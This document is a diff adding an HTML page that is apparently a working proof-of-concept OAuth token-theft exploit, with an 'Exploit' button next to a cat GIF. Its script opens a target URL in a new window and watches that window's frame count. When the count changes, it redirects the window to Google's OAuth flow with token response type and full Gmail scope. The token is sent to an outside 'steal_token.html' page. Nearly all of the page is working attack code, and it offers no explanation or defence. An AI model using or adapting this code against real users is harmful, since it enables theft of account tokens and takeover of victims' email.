@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f2f2f2;
+        }
+        img {
+            width: 400px;
+            height: 500px;
+            object-fit: contain;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #4caf50;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+    </style>
+<script>
+  // Get the URL parameter
+    function getParameterByName(name, url) {
+        if (!url) url = window.location.href;
+        name = name.replace(/[\[\]]/g, "\\$&");
+        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+            results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return '';
+        return decodeURIComponent(results[2].replace(/\+/g, " "));
+    }
+let foo;
+    let baselength;
+    var urlParam = getParameterByName('url');
+    function init() {
+        baselength = foo.length;
+        console.log("Setting base to " + baselength);      
+        watch();
+    }
+    function watch() {
+        if (foo.length != baselength) {
+            console.log("baselength: " + baselength);
+            console.log("foo.length " + foo.length);
+            console.log('Google navigation');
+            foo.location.href = "https://accounts.google.com/o/oauth2/v2/auth?client_id=366344551598-sf386f3s7c2rb9otg7h9j0tqght72ika.apps.googleusercontent.com&redirect_uri=https://o-auth-eta.vercel.app/steal_token.html&response_type=token&scope=https%3A%2F%2Fmail.google.com%2F";
+        }else{
+            console.log("watch(): " + foo.length  + " / " + baselength);
+            setTimeout(watch,1);
+        }
+    }
+    function launch(){
+        foo = window.open(urlParam, "foo", "");
+        setTimeout(init,1200);
+    }
+    launch();
+</script>
+</head>
+<body>
+    <script src="/main.js"></script>
+    <img src="https://media.tenor.com/HQEVMrJMMI0AAAAi/cat-cat-tutu.gif">
+    </br>
+    <button onclick="launch()">Exploit</button>
+</body>
+</html>
